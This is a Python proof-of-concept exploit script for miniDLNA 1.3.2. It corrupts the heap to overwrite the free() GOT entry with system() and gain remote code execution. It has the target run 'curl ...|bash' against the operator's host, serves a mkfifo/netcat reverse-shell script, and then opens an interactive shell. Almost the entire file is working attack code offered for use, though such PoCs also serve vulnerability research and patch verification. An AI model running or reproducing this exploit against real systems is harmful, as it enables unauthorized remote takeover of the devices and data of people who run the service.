#!/usr/bin/env python3
import pwn
import sys
import socket
import time
import argparse

from helper import Payload
from helper import connect_sockets
from helper import create_sockets
from helper import hexarg
from helper import pad
from helper import sendsocks
from helper import TIME
from helper import xpr, xerr
from helper import heap_corruption
from helper import asciitxt


GOT_TARGET = 0x45c118
LIBC_SYSTEM = 0x7ffff61ee020
ALLOC_SIZE = 0x60-8


if __name__ == "__main__":
    poc_parser = argparse.ArgumentParser(
        add_help=True,
        description='miniDLNA 1.3.2 Heap OOB r/w RCE exploit -> reverse shell (by @hyprdude)',
        formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    poc_parser.add_argument(
        'target_ip',
        help='IP address of host running the service')
    poc_parser.add_argument(
        '--target_port',
        default=8200,
        help="Target port",
        type=int)
    poc_parser.add_argument(
        '--lhost',
        default="10.10.13.20",
        help="Bind IP for reverse shell listener",
        type=str)
    poc_parser.add_argument(
        '--lport',
        default=1337,
        help="Bind port for reverse shell listener",
        type=int)
    poc_parser.add_argument(
        '--system_addr',
        default=LIBC_SYSTEM, # libc system()
        help="Address to overwrite GOT entry with (defaults to system() at 0x%(default)x)",
        type=hexarg)
    poc_parser.add_argument(
        '--got_addr',
        default=GOT_TARGET, # target GOT offset
        help="Address of the GOT (default: 0x%(default)x)",
        type=hexarg)

    args = poc_parser.parse_args()
    arguments = ['target_ip']
    for i in arguments:
        if getattr(args, i) is None:
            poc_parser.print_help()
            sys.exit(1)

    print(asciitxt)
    xpr(f"target: {args.target_ip}:{args.target_port}")
    xpr(f"reverse shell listener at: {args.lhost}:{args.lport}")

    # perform the heap corruption to get everything set up to have malloc return
    # the pointer to the GOT on a subsequent allocation
    _ = heap_corruption(args.got_addr, args.target_ip, args.target_port)

    # set up the command string that will be passed to system()
    staging_server_addr = f"{args.lhost}:{args.lport}"
    command_str = f"curl {staging_server_addr}/x|bash".encode()
    command_padding = b""
    OFFSET_TO_FREE = 64
    if len(command_str) < OFFSET_TO_FREE:
        command_padding = b"\x00" * (OFFSET_TO_FREE - len(command_str))
    if len(command_str) > OFFSET_TO_FREE:
        xpr("command string too long using provided args, offsets will fail. bailing...")
        sys.exit(1)
    command = command_str + command_padding

    # set up fake GOT table for the overwrite
    got_table = b""
    got_table += pwn.p64(args.system_addr) # free() entry
    got_table += pwn.p64(0x0) # pad 8 bytes
    got_table += pwn.p64(args.system_addr) # fprintf() entry
    final_payload = command + got_table
    padded_payload = pad(ALLOC_SIZE, final_payload)

    xpr(f"overwriting free() GOT entry at 0x{args.got_addr:x} w/ system() addr 0x{args.system_addr:x}")
    xpr(f"command that will be passed to system(): '{command_str.decode()}'")

    # first listener for staging rev shell script over http
    l = pwn.listen(args.lport)

    # we need to make at least 3 alloc's to get the right chunk back
    final = create_sockets(3)
    connect_sockets(final, args.target_ip, args.target_port)
    sendsocks(final, padded_payload)

    # close the last request we connected to free the req_buf and trigger the exploit
    final.pop().close()

    # this is the script that will be piped to a shell to spawn the reverse shell
    reverse_shell_cmd = f"rm -f /tmp/f; mkfifo /tmp/f;"
    reverse_shell_cmd += f"cat /tmp/f | /bin/sh -i 2>&1 | nc {args.lhost} {args.lport} >/tmp/f"
    resp = f"HTTP/1.1 200 OK\r\nContent-Length: {len(reverse_shell_cmd)}\r\n"
    resp += f"Connection: Closed\r\n\r\n"

    # handle the http request to serve script to spawn reverse shell
    l.settimeout(1)
    x = l.wait_for_connection()
    if x.connected():
        l.sendline(resp.encode() + reverse_shell_cmd.encode())
        l.close()
    else:
        xerr("=ERROR=: Timed out waiting for staging connection, exploit likely failed")
        xpr("tip: try adjusting the --got_addr or --system_addr arguments if SEGV; make sure curl is available on target")
        sys.exit(1)

    # wait for the incoming reverse shell connection; bail if we don't get it in a second.
    l = pwn.listen(args.lport)
    l.settimeout(1)
    x = l.wait_for_connection()
    if x.connected():
        xpr("~~~ <CHONKCHONKCHONK> ~~~")
        l.interactive()
    else:
        xerr("=ERROR=: Timed out waiting for reverse shell connection, exploit likely failed")
        xpr("tip: try adjusting the --got_addr or --system_addr arguments if SEGV; make sure netcat is available on target")
        sys.exit(1)

